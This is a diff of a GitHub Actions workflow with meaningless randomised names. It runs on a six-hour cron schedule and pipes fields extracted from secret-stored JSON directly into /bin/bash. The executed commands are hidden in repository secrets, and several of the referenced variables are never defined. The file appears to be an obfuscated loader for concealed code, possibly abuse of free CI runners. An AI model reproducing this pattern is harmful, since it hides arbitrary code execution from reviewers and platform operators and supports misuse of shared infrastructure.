@@ -2,8 +2,7 @@ name: fnjcjkkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: fnjcjkkk
         env:
-          gg5: ${{ secrets.gg5 }}
+          i053: ${{ secrets.i053 }}
         run: |
-          echo $gg5 | jq -r .cxin65 | /bin/bash
-          echo $w9 | jq -r .yqesu56 | /bin/bash
-          echo $j44962 | jq -r .glavr491 | /bin/bash
-          echo $zqtjl410 | jq -r .cbfrj0882 | /bin/bash
+          echo $i053 | jq -r .d616 | /bin/bash
+          echo $fg7414 | jq -r .x326 | /bin/bash
+          echo $brfc02 | jq -r .mum6 | /bin/bash
+          echo $p88398 | jq -r .swgs6 | /bin/bash
+          echo $pr0 | jq -r .mkn4631 | /bin/bash
+          echo $r9093 | jq -r .vozo9168 | /bin/bash
 
